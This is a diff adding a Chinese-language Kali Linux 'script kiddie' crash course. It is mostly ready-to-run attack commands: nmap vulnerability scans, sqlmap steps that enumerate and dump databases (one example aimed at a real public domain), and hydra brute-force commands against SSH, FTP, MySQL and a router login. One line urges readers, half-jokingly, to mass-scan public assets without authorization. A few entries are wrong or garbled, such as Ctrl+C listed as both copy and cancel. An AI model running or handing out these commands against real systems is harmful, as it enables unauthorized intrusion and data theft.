@@ -1,0 +1,99 @@
+kali linux脚本小子速成
+$如果你耐心看十分钟，你会惊奇的发现我讲的是一堆废话，别急。kali linux博大精深,绝对不是十分钟就能学的完,真正的好东西永远都是夹在屎里，想学你想要的，拿出你的决心来。
+
+Kali Linux 快捷键
+Ctrl + Alt + T 打开一个新的命令行终端。
+Ctrl + C 复制
+Ctrl + Z 撤消
+Ctrl + S 用于保存
+Ctrl + Q 退出
+Ctrl + D 使用这个快捷方式，我们可以关闭终端窗口
+由于kali linux不像windows用鼠标点位置，下面两个快捷键必备
+《Ctrl + E 使用这个快捷方式，我们可以将光标移动到行尾
+Ctrl + A 使用这个快捷方式，我们可以将光标移动到行首》
+Ctrl + C 取消当前正在运行的命令，比较快
+
+Kali Linux系统目录结构及文件属性：https://www.cnblogs.com/zhantang/p/13219877.html
+想学，自己看，等你渗透技术比我强的时，我再求你，懂吗？
+
+Kali Linux其核心功能包括：
+进程管理·内存管理·文件系统管理·网络管理
+Kali Linux 支持多种网络通信协议，包括 TCP/IP、UDP、HTTP、HTTPS 等。
+
+共14大类，108款Kali Linux工具
+命令行模式、图形用户界面模式和Shell命令行模式
+14类：信息搜集
+脆弱性分析
+漏洞利用
+嗅探和欺骗
+密码工具
+权限提升
+web应用
+无线攻击
+硬件黑客
+权限维持
+取证工具
+逆向工程
+压力测试
+报告工具
+108款：
+
+nmap
+常用操作nmap 192.168.1.10
+漏洞探查：nmap -sV --script vulners 10.10.10.19 $加metasploit进行脚本攻击
+识别端口服务和版本：nmap -sV -oA testPortVersion 10.10.10.19
+路由追踪命令：nmap --traceroute -sV ip名
+
+sqlmap
+sqlmap -u "www.baidu.com"
+大家尽量要在未授权的情况下去对公网资产进行批量扫描，去踩缝纫机吧!
+sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" --dbs $获取当前数据库服务所开启的数据库名称 sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" -D 数据库名 --tables $获取某数据库下的所有表名 `sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" -D 数据库名 -T 表名 --columns $获取D数据库下T表内的所有字段``sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" -D 数据库名 -T 表名 -C 字段名 --dump $将该字段的内容全部获取出来并存储，在最后的信息中会有存储路径
+
+
+hydra
+使用语法：hydra 参数 IP地址 服务名
+帮助命令：hydra -h
+常用命令：hydra [-l 用户名|–L 用户名文件路径] [-p 密码|–P 密码文件路径] [-t 线程数] [–vV 显示详细信息] [–o 输出文件路径] [–f 找到密码就停止] [–e ns 空密码和指定密码试探] [ip|-M ip列表文件路径]
+参数 介绍
+-h 查看帮助菜单。
+-R 继续从上一次进度接着破解。
+-S 采用SSL链接。
+-s PORT 可通过这个参数指定非默认端口。
+-l LOGIN 指定破解的用户，对特定用户破解。
+-L FILE 指定用户名字典。
+-p PASS 小写，指定密码破解，少用，一般是采用密码字典。
+-P FILE 大写，指定密码字典。
+-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。
+-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
+-M FILE 指定目标列表文件一行一条。
+-o FILE 指定结果输出文件。
+-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
+-t TASKS 同时运行的线程数，默认为16。as
+-w TIME 设置最大超时的时间，单位秒，默认是30s。
+-v/-V 显示详细过程。
+-x -h 密码生成器帮助
+实战：命令：hydra -L user.txt -P passwd.txt -t 2 -vV -e ns 192.168.10.30 ssh
+命令：hydra -l root -P passwd.txt -t 2 -vV -e ns 192.168.10.30 ssh
+不知账号命令：hydra -L user.txt -P passwd.txt -t 2 -vV -e ns 192.168.10.30 ftp
+知道账号命令：hydra -l root -P passwd.txt -t 2 -vV -e ns 192.168.10.30 ft
+命令：hydra -l root -P passwd.txt -t 6 -vV -e ns 192.168.10.150 mysql
+&路由器爆破：hydra -l admin -x 6:10:1aA.~!@#$%^&()-= -t 6 -vV -e ns 192.168.10.50 http-get /
+
+metasploit《源漏洞库》
+开启命令：msfconsole
+启动PostgreSQL数据库:service postgresql start
+初始化数据库:msfdb init
+创建一个名为name的工作区:workspace -a [name]
+查看当前所在的工作区:worksapace
+切换工作区:workspace default
+攻击教程
+加nmap扫描之类的
+查找渗透测试模块语法：search [options]
+1、通过CVE漏洞网站查找
+cve漏洞网站地址 ： https://www.cvedetails.com/
+2、通过exploitDB
+exploitDB漏洞网址 ：https://www.exploit-db.com/
+3、手动导入第三方模块
+从exploitDB网站下载的第三方模块 导入exiftran
+
+结束语：这些当脚本小子足够了，我学习kali linux时，没人告诉我该怎么快速学kali linux，我能怎么办呢？只能天天空想当一个所谓的黑客(黑客热爱计算机技术，热爱和平，更热爱自由和还有热衷于互联网上的资源分享)，这个教程献给以前学习kali linux的我
